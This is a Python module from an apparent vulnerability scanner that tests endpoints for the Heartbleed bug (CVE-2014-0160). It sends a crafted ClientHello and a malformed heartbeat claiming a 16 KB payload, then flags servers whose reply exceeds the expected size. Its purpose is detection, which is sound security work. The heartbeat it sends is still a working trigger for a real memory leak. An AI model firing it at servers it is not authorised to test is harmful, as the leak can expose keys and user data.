##
# @file cve-2014-0160.py
#
# @brief    Defines the exploit module for CVE-2014-0160 (Heartbleed)
import socket
import struct
import searchengine.debugtools
from searchengine.vulnerability_scanner.utils import recvall, hex2bin
from searchengine.vulnerability_scanner.exploit import BaseExploit

##
# @class    Exploit
#
# @brief    CVE-2014-0160 exploit implementation.
#
# @author   Edward Callahan
# @date 8/5/2016
class Exploit(BaseExploit):

    ##
    # @fn   __init__(self)
    #
    # @brief    Class initializer.
    #
    # @author   Edward Callahan
    # @date 8/5/2016
    #
    # @param    self    The class instance that this method operates on.
    def __init__(self):
        return super().__init__(
            "cve-2014-0160",
            "1.0-alpha",
            "Heartbleed"
        )

    ##
    # @fn   feed_endpoint(self, endpoint)
    #
    # @brief    Overridden from BaseExploit.
    #
    # @author   Edward Callahan
    # @date 8/5/2016
    #
    # @param    self        The class instance that this method operates on.
    # @param    endpoint    The endpoint.
    def feed_endpoint(self, endpoint):
        self.__test_if_vulnerable(endpoint)


    ###################################################################
    # Heartbleed Functions & Consts
    # Resources:    https://gist.github.com/eelsivart/10174134
    #               https://tools.ietf.org/html/rfc5246
    #               https://www.sans.org/reading-room/whitepapers/authentication/ssl-tls-hood-34297
    ###################################################################

    CONTENT_TYPE_HEARTBEAT = 24
    CONTENT_TYPE_ALERT = 21
    CONTENT_TYPE_HANDSHAKE = 22
    HANDSHAKE_TYPE_SERVER_HELLO_DONE = 0x0E

    ##
    # @fn   __build_client_hello(self, tls_version)
    #
    # @brief    Builds a TLS client_hello message.
    #
    # @author   Intricate
    # @date 8/7/2016
    #
    # @param    self            The class instance that this method operates on.
    # @param    tls_version     The client's version of TLS.
    def __build_client_hello(self, tls_version):
        return [
        # TLS header (5 bytes)
            # ContentType
                0x16,           # (0x16 for Handshake)
            # ProtocolVersion
                0x03, tls_version,
            # Length
                0x00, 0xdc,

        # Handshake header
            # HandshakeType
                0x01,           # (0x01 for ClientHello)
            # Length
                0x00, 0x00, 0xd8,
            # ProtocolVersion
                0x03, tls_version,
            # Random (32 byte)
                0x53, 0x43, 0x5b, 0x90, 0x9d, 0x9b, 0x72, 0x0b,
                0xbc, 0x0c, 0xbc, 0x2b, 0x92, 0xa8, 0x48, 0x97,
                0xcf, 0xbd, 0x39, 0x04, 0xcc, 0x16, 0x0a, 0x85,
                0x03, 0x90, 0x9f, 0x77, 0x04, 0x33, 0xd4, 0xde,
            # SessionID length
                0x00,
            # CipherSuite length
                0x00, 0x66,
            # CipherSuites (51 suites)
                0xc0, 0x14, 0xc0, 0x0a, 0xc0, 0x22, 0xc0, 0x21,
                0x00, 0x39, 0x00, 0x38, 0x00, 0x88, 0x00, 0x87,
                0xc0, 0x0f, 0xc0, 0x05, 0x00, 0x35, 0x00, 0x84,
                0xc0, 0x12, 0xc0, 0x08, 0xc0, 0x1c, 0xc0, 0x1b,
                0x00, 0x16, 0x00, 0x13, 0xc0, 0x0d, 0xc0, 0x03,
                0x00, 0x0a, 0xc0, 0x13, 0xc0, 0x09, 0xc0, 0x1f,
                0xc0, 0x1e, 0x00, 0x33, 0x00, 0x32, 0x00, 0x9a,
                0x00, 0x99, 0x00, 0x45, 0x00, 0x44, 0xc0, 0x0e,
                0xc0, 0x04, 0x00, 0x2f, 0x00, 0x96, 0x00, 0x41,
                0xc0, 0x11, 0xc0, 0x07, 0xc0, 0x0c, 0xc0, 0x02,
                0x00, 0x05, 0x00, 0x04, 0x00, 0x15, 0x00, 0x12,
                0x00, 0x09, 0x00, 0x14, 0x00, 0x11, 0x00, 0x08,
                0x00, 0x06, 0x00, 0x03, 0x00, 0xff,
            # CompressionMethod length
                0x01,
            # CompressionMethod
                0x00,           # (0x00 for NULL)
            # Extensions length
                0x00, 0x49,
            # Extension: ec_point_formats
                0x00, 0x0b, 0x00, 0x04, 0x03, 0x00, 0x01, 0x02,
            # Extension: elliptic_curves
                0x00, 0x0a, 0x00, 0x34, 0x00, 0x32, 0x00, 0x0e,
                0x00, 0x0d, 0x00, 0x19, 0x00, 0x0b, 0x00, 0x0c,
                0x00, 0x18, 0x00, 0x09, 0x00, 0x0a, 0x00, 0x16,
                0x00, 0x17, 0x00, 0x08, 0x00, 0x06, 0x00, 0x07,
                0x00, 0x14, 0x00, 0x15, 0x00, 0x04, 0x00, 0x05,
                0x00, 0x12, 0x00, 0x13, 0x00, 0x01, 0x00, 0x02,
                0x00, 0x03, 0x00, 0x0f, 0x00, 0x10, 0x00, 0x11,
            # Extension: SessionTicket TLS
                0x00, 0x23, 0x00, 0x00,
            # Extension: Heartbeat
                0x00, 0x0f, 0x00, 0x01, 0x01
        ]

    ##
    # @fn   __build_heartbeat(self, tls_version)
    #
    # @brief    Builds a TLS heartbeat message.
    #
    # @author   Intricate
    # @date 8/7/2016
    #
    # @param    self            The class instance that this method operates on.
    # @param    tls_version     The client's version of TLS.
    def __build_heartbeat(self, tls_version):
        return [
            0x18,
            0x03, tls_version,
            0x00, 0x03,
            0x01,
            0x40, 0x00
            ]

    ##
    # @fn   __recv_tls_record(self)
    #
    # @brief    Receive a TLS record from the server.
    #
    # @author   Intricate
    # @date 8/7/2016
    #
    # @param    self    The class instance that this method operates on.
    def __recv_tls_record(self):
        tls_record_hdr = recvall(self.sock, 5)
        if not tls_record_hdr:
            searchengine.debugtools.log("{}: Unexpected EOF while receiving header in __recv_tls_record()".format(self.__class__.__module__))
            searchengine.debugtools.log("{}".format(tls_record_hdr))
            return None, None, None
        content_type, protocol_version, length = struct.unpack('>BHH', tls_record_hdr)
        tls_record_msg = recvall(self.sock, length)
        if not tls_record_msg:
            searchengine.debugtools.log("{}: Unexpected EOF while receiving data in __recv_tls_record()".format(self.__class__.__module__))
            searchengine.debugtools.log("{}".format(tls_record_msg))
            return None, None, None
        return content_type, protocol_version, tls_record_msg

    ##
    # @fn   __connect(self, endpoint, port)
    #
    # @brief    Open a socket and establish a TCP session with the endpoint.
    #
    # @author   Intricate
    # @date 8/7/2016
    #
    # @param    self        The class instance that this method operates on.
    # @param    endpoint    The endpoint's hostname/ip.
    # @param    port        The endpoint port.
    def __connect(self, endpoint, port):
        try:
            endpoint = socket.gethostbyname(endpoint)   # Will switch over to getaddrinfo another time...
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((endpoint, port))
        except Exception as e:
            searchengine.debugtools.log_exception(e)
            return None
        return sock

    ##
    # @fn   __test_if_vulnerable(self)
    #
    # @brief    This will test if the endpoint is vulnerable to CVE-2014-0160.
    #
    # @author   Intricate
    # @date 8/7/2016
    #
    # @param    self        The class instance that this method operates on.
    # @param    endpoint    The endpoint's hostname/ip.
    def __test_if_vulnerable(self, endpoint):
        self.sock = self.__connect(endpoint, 443)
        if self.sock is None:
            return

        client_hello_msg = hex2bin(self.__build_client_hello(0x02))
        heartbeat_msg = hex2bin(self.__build_heartbeat(0x02))

        # Send client_hello and recv until we get a server_hello_done
        try:
            self.sock.send(client_hello_msg)
        except Exception as e:
            searchengine.debugtools.log_exception(e)
            return
        while True:
            content_type, protocol_version, tls_record_msg = self.__recv_tls_record()
            if content_type is None:
                searchengine.debugtools.log("{}: Unexpected content_type in __test_if_vulnerable()".format(self.__class__.__module__))
                return
            elif content_type == self.CONTENT_TYPE_HANDSHAKE and tls_record_msg[0] == self.HANDSHAKE_TYPE_SERVER_HELLO_DONE:
                searchengine.debugtools.log("{}: server_hello_done received in __test_if_vulnerable()".format(self.__class__.__module__))
                break

        # Send the heartbeat
        try:
            self.sock.send(heartbeat_msg)
        except Exception as e:
            searchengine.debugtools.log_exception(e)
            return
        while True:
            content_type, protocol_version, tls_record_msg = self.__recv_tls_record()
            if content_type is None:
                searchengine.debugtools.log("{}: Unexpected content_type after sending heartbeat. Server is probably not vuln.".format(self.__class__.__module__))
                return
            elif content_type == self.CONTENT_TYPE_HEARTBEAT:
                if len(tls_record_msg) > 3:
                    searchengine.debugtools.log("{}: Server responded with more data than it should have! Server is vuln.".format(self.__class__.__module__))
                    self._set_endpoint_is_vulnerable()
                    return
                else:
                    searchengine.debugtools.log("{}: Server did not respond with any more data than it should have. Server is probably not vuln.".format(self.__class__.__module__))
                    searchengine.debugtools.log("{}".format([content_type, protocol_version, tls_record_msg]))
                    return
            elif content_type == self.CONTENT_TYPE_ALERT:
                searchengine.debugtools.log("{}: Server responded with an alert. Server is probably not vuln.".format(self.__class__.__module__))
                searchengine.debugtools.log("{}".format([content_type, protocol_version, tls_record_msg]))
                return
